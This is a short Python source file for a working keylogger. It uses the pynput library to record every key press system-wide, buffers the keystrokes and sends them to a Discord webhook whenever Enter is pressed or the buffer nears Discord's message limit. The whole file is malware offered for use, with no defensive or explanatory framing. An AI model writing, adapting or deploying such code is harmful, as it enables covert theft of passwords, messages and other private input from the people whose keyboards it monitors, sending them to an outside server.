import pynput
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook

webhook_url = '#'     # Paste here your Webhook URL (instructions in README.md)
keys_buffer = ''     # Create empty buffer variable

def send_message(message):
    DiscordWebhook(url=webhook_url, content=message).execute()     # Send message using Webhook

def on_press(key):     # Executes on each key pressed
    global keys_buffer
    if str(key)[:4] == 'Key.':     # Check if pressed key is not number, letter or character
        key = '[' + str(key) + ']'
    else:
        key = str(key)[1]
    if len(keys_buffer) + len(key) >= 2000 or key == '[Key.enter]':     # Check if keys_buffer exceeds Discord's 2000 characters per message limit or ENTER is pressed
        send_message(keys_buffer)     # Send logged keys on Discord channel
        keys_buffer = key     # Reset keys_buffer to log new key presses
    else:
        keys_buffer += key     # Concatenate new logged key presses to make it look simpler

with Listener(on_press=on_press) as listener:
    listener.join()     # Start the listener                                                                                             